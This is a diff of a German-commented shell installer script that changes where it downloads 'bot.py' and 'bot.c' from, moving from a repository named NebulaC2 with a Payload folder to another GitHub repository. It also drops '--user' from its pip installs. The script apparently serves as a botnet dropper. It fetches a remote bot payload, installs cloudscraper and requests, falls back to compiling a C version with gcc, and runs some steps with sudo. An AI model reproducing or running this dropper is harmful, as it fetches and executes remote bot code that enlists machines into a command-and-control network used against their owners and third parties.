@@ -18,12 +18,12 @@ sudo pkg install -y python3 python3-pip
 sudo pkg install -y python python-pip
 
 # --- Python-Skript herunterladen ---
-wget -O bot.py https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.py
-curl -o bot.py https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.py
+wget -O bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py
+curl -o bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py
 
 # --- Python-Pakete installieren ---
-pip3 install --user cloudscraper requests
-pip install --user cloudscraper requests
+pip3 install cloudscraper requests
+pip install cloudscraper requests
 
 sudo pip3 install cloudscraper requests
 sudo pip install cloudscraper requests
@@ -39,8 +39,8 @@ if [ $? -ne 0 ]; then
       if [ $? -ne 0 ]; then
         echo "Python funktioniert nicht, versuche C-Programm..."
         # --- C-Programm herunterladen ---
-        wget -O bot.c https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.c
-        curl -o bot.c https://raw.githubusercontent.com/NixWasHere/NebulaC2/main/src/Payload/bot.c
+        wget -O bot.c https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.c
+        curl -o bot.c https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.c
 
         # --- Kompilieren ohne und mit sudo ---
         gcc -o bot bot.c
